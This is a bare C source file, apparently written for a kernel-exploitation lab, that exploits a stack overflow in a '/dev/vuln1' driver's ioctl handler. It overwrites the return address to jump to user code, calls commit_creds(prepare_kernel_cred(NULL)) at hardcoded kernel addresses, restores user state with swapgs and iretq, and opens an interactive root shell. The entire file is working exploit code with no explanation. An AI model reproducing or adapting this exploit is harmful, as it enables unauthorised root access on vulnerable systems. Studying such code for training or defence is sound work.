#include "stdlib.h"
#include "stdio.h"
#include "string.h"
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define IOCTL_VULN1_WRITE 4141
#define COMMIT_CREDS_ADDRESS 0xffffffff810d26f0ul
#define PREPARE_KERNEL_CRED_ADDRESS 0xffffffff810d2950ul

typedef int (* t_commit_creds)(void *);
typedef void *(* t_prepare_kernel_cred)(void *);

t_commit_creds commit_creds = (t_commit_creds)COMMIT_CREDS_ADDRESS;
t_prepare_kernel_cred prepare_kernel_cred = (t_prepare_kernel_cred)PREPARE_KERNEL_CRED_ADDRESS;

unsigned long u_cs;
unsigned long u_ss;
unsigned long u_rsp;
unsigned long u_rflags;
unsigned long u_rip;

void start_sh() {
    char *args[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", args, NULL);
}

void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov u_cs, cs;"
        "mov u_ss, ss;"
        "mov u_rsp, rsp;"
        "pushf;"
        "pop u_rflags;"
        ".att_syntax;"
        );
    u_rip = (unsigned long)&start_sh;
}

void restore_state() {
        __asm__(
            ".intel_syntax noprefix;"
            "swapgs;""push u_ss;"     // restore gs reg and push all
            "push u_rsp;"             // other values to the stack
            "push u_rflags;"
            "push u_cs;"
            "push u_rip;"             // points to start_sh
            "iretq;"
            ".att_syntax;"
            );
}


void exploit(){

  commit_creds(prepare_kernel_cred(NULL));

  restore_state();

}

void ioctl_write(int fd){

	char buffer[512];
	memset(buffer, 0x41, sizeof(buffer));

  // overwrite return address
  *(unsigned long *)&buffer[0x108] = (unsigned long) &exploit;

  //save user state
  save_state();
	ioctl(fd, IOCTL_VULN1_WRITE, &buffer);
}

void main()
{
  int fd;

  fd = open("/dev/vuln1", 0);
  if (fd < 0) {
    printf ("Cannot open device file");
    exit(-1);
  }

  ioctl_write(fd);
  close(fd);
}
